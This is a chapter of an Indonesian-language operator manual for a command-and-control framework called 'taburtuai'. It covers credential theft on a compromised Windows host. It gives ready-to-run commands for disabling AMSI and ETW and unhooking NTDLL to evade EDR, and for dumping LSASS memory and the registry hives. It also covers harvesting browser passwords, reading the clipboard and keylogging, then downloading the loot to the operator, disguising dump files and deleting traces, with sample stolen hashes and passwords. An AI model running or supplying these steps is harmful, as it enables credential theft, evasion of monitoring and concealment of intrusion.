# 12 — Credential Access

## Persiapan Sebelum Credential Harvesting

Sebelum mengambil kredensial, pastikan kondisi berikut:

```
# 1. Cek privilege saat ini
taburtuai(IP:8000) › cmd 2703886d "whoami /priv"
# Minimal butuh SeDebugPrivilege untuk LSASS dump

# 2. Bypass AMSI agar PowerShell tidak dideteksi
taburtuai(IP:8000) › bypass amsi 2703886d --wait

# 3. Bypass ETW agar tidak ada event logging
taburtuai(IP:8000) › bypass etw 2703886d --wait

# 4. Unhook NTDLL agar EDR hook tidak interfere
taburtuai(IP:8000) › evasion unhook 2703886d --wait
```

---

## LSASS Minidump

Dump memori proses lsass.exe untuk ekstraksi kredensial. LSASS menyimpan
credential cache Windows (NTLM hash, Kerberos ticket, cleartext password).

### Dump ke Path Default

```
taburtuai(IP:8000) › creds lsass 2703886d --wait
```

**Output:**
```
[*] Dumping LSASS memory (PID: 724)...
[*] Using MiniDumpWriteDump via indirect syscall...
[+] LSASS dump completed.

    Path : C:\Windows\Temp\lsass.dmp
    Size : 47,185,920 bytes (44.9 MB)

[i] Download dengan: files download 2703886d "C:\Windows\Temp\lsass.dmp" ./loot/lsass.dmp
[i] Hapus jejak : files delete 2703886d "C:\Windows\Temp\lsass.dmp"
```

### Dump ke Path Kustom

```
taburtuai(IP:8000) › creds lsass 2703886d \
  --output "C:\Users\Public\Pictures\thumb.dmp" \
  --wait
```

**Output:**
```
[+] LSASS dump completed.
    Path: C:\Users\Public\Pictures\thumb.dmp (44.9 MB)
```

Ekstensi `.dmp` tidak wajib — bisa `.jpg`, `.png`, atau apapun untuk kamuflase.

### Download dan Analisis

```
# Download dump ke mesin operator
taburtuai(IP:8000) › files download 2703886d \
  "C:\Windows\Temp\lsass.dmp" \
  ./loot/lsass.dmp \
  --timeout 120 \
  --wait

# Ekstraksi dengan pypykatz (di mesin operator, Linux)
pypykatz lsa minidump ./loot/lsass.dmp

# Atau dengan mimikatz (di Windows operator)
# sekurlsa::minidump loot\lsass.dmp
# sekurlsa::logonpasswords
```

**Output pypykatz (contoh):**
```
INFO:root:Parsing file ./loot/lsass.dmp
FILE: ./loot/lsass.dmp ======== 
== LogonSession ==
authentication_id 1234567 (0x12d687)
session_id 1
username john.doe
domainname CORP
logon_server DC01
logon_time 2026-04-23T08:44:12.000000+00:00
sid S-1-5-21-1234567890-987654321-1234567890-1001
	== MSV ==
		Username: john.doe
		Domain: CORP
		LM: NA
		NT: aad3b435b51404eeaad3b435b51404ee:e10adc3949ba59abbe56e057f20f883e
		SHA1: c1328472a5f52d7f10a8a3b8c4a98d7e3b4e5f6a
	== WDIGEST [12d687]==
		username john.doe
		domainname CORP
		password 5ecureP@ssword2026!
	== Kerberos ==
		Username: john.doe
		Domain: CORP.LOCAL
```

### Hapus Jejak

```
taburtuai(IP:8000) › files delete 2703886d "C:\Windows\Temp\lsass.dmp" --wait
# [+] File deleted.
```

---

## SAM/SYSTEM/SECURITY Hive Dump

Dump registry hive SAM, SYSTEM, dan SECURITY untuk ekstraksi password hash lokal.
Tidak butuh LSASS — bisa dilakukan tanpa SeDebugPrivilege.

### Dump Registry Hive

```
taburtuai(IP:8000) › creds sam 2703886d --wait
```

**Output:**
```
[*] Dumping registry hives...
[*] Saving SAM hive     → C:\Windows\Temp\sam.hive
[*] Saving SYSTEM hive  → C:\Windows\Temp\system.hive
[*] Saving SECURITY hive→ C:\Windows\Temp\security.hive
[+] Registry hives dumped.

    sam.hive     : 65,536 bytes
    system.hive  : 12,288,000 bytes
    security.hive: 262,144 bytes
```

### Ke Direktori Kustom

```
taburtuai(IP:8000) › creds sam 2703886d \
  --output-dir "C:\Users\Public\Documents" \
  --wait
```

### Download dan Analisis

```
# Download ketiga file
taburtuai(IP:8000) › files download 2703886d "C:\Windows\Temp\sam.hive" ./loot/sam.hive --wait
taburtuai(IP:8000) › files download 2703886d "C:\Windows\Temp\system.hive" ./loot/system.hive --wait
taburtuai(IP:8000) › files download 2703886d "C:\Windows\Temp\security.hive" ./loot/security.hive --wait

# Ekstraksi hash dengan secretsdump (impacket)
python3 -m impacket.examples.secretsdump \
  -sam ./loot/sam.hive \
  -system ./loot/system.hive \
  -security ./loot/security.hive \
  LOCAL
```

**Output secretsdump:**
```
[*] Target system bootKey: 0x3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
john.doe:1001:aad3b435b51404eeaad3b435b51404ee:e10adc3949ba59abbe56e057f20f883e:::
[*] Dumping cached domain logon information (domain/username:hash)
CORP/john.doe:$DCC2$10240#john.doe#8a7b9c0d1e2f3a4b5c6d7e8f9a0b1c2d
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
 CORP\DESKTOP-QLPBF95$:plain_password_hex:...
[*] DPAPI_SYSTEM
dpapi_machinekey: 0xa1b2c3d4e5f6...
dpapi_userkey   : 0x1a2b3c4d5e6f...
```

### Hapus Jejak

```
taburtuai(IP:8000) › files delete 2703886d "C:\Windows\Temp\sam.hive" --wait
taburtuai(IP:8000) › files delete 2703886d "C:\Windows\Temp\system.hive" --wait
taburtuai(IP:8000) › files delete 2703886d "C:\Windows\Temp\security.hive" --wait
```

---

## Browser Credential Harvest

Ambil password tersimpan dari browser populer (Chrome, Edge, Firefox, Brave, Opera).

```
taburtuai(IP:8000) › creds browser 2703886d --wait
```

**Output:**
```
[*] Harvesting browser credentials...
[*] Checking Chrome...
[*] Checking Microsoft Edge...
[*] Checking Firefox...
[*] Checking Brave...
[+] Credential harvest completed.

    CHROME (32 entries):
    ─────────────────────────────────────────────────────────
    URL            : https://mail.corp.local
    Username       : john.doe@corp.local
    Password       : CorpMail@2026!
    
    URL            : https://github.com
    Username       : johndoe-dev
    Password       : ghp_abc123xyz456...
    
    URL            : https://192.168.1.1
    Username       : admin
    Password       : router123

    MICROSOFT EDGE (8 entries):
    ─────────────────────────────────────────────────────────
    URL            : https://portal.azure.com
    Username       : john.doe@corp.onmicrosoft.com
    Password       : AzureAdmin2026!

    FIREFOX (4 entries):
    ─────────────────────────────────────────────────────────
    URL            : https://vpn.corp.local
    Username       : john.doe
    Password       : VPN_S3cur3!
```

---

## Clipboard Read

Ambil konten clipboard target saat ini.

```
taburtuai(IP:8000) › creds clipboard 2703886d --wait
```

**Output (clipboard kosong):**
```
[+] Clipboard content: (empty)
```

**Output (ada konten):**
```
[+] Clipboard content (127 bytes):

Creds: admin / P@ssw0rd123!
Server: db-prod.corp.local:5432
DB: production_db
```

### Gunakan dengan Keylogger

Kombinasikan clipboard monitoring dengan keylogger untuk intersepsi credential yang di-copy-paste:

```
# Start keylogger
taburtuai(IP:8000) › keylog start 2703886d --duration 300 --wait

# Setelah beberapa menit, dump keystrokes
taburtuai(IP:8000) › keylog dump 2703886d --wait

# Sekaligus ambil clipboard
taburtuai(IP:8000) › creds clipboard 2703886d --wait
```

---

## Skenario: Credential Harvesting Lengkap

```bash
# ── Persiapan ─────────────────────────────────────────────
bypass amsi 2703886d --wait
bypass etw  2703886d --wait
evasion unhook 2703886d --wait

# ── LSASS dump ────────────────────────────────────────────
creds lsass 2703886d --output "C:\Temp\debug.dmp" --wait
files download 2703886d "C:\Temp\debug.dmp" ./loot/lsass.dmp --timeout 120 --wait
files delete 2703886d "C:\Temp\debug.dmp" --wait

# ── SAM dump ──────────────────────────────────────────────
creds sam 2703886d --output-dir "C:\Temp" --wait
files download 2703886d "C:\Temp\sam.hive" ./loot/sam.hive --wait
files download 2703886d "C:\Temp\system.hive" ./loot/system.hive --wait
files download 2703886d "C:\Temp\security.hive" ./loot/security.hive --wait
files delete 2703886d "C:\Temp\sam.hive" --wait
files delete 2703886d "C:\Temp\system.hive" --wait
files delete 2703886d "C:\Temp\security.hive" --wait

# ── Browser creds ──────────────────────────────────────────
creds browser 2703886d --wait

# ── Clipboard ─────────────────────────────────────────────
creds clipboard 2703886d --wait

# ── Analisis di mesin operator ─────────────────────────────
# pypykatz lsa minidump ./loot/lsass.dmp
# python3 -m impacket.examples.secretsdump -sam ... LOCAL
```

---

## Troubleshooting

| Error | Penyebab | Solusi |
|-------|----------|--------|
| `Access denied` (LSASS) | Tidak ada SeDebugPrivilege | Escalate privilege dulu |
| `Protected process` (LSASS) | PPL aktif | Gunakan driver PPL bypass atau indirect syscall |
| `Access denied` (SAM) | Tidak ada admin | Escalate ke admin/SYSTEM |
| Browser decrypt failed | DPAPI key tidak cocok | Jalankan sebagai user yang sama dengan browser |
| Clipboard empty | Tidak ada yang di-copy | Tunggu dan coba lagi, atau kombinasi dengan keylogger |

---

**Selanjutnya:** [13 — Reconnaissance](13-recon.md)
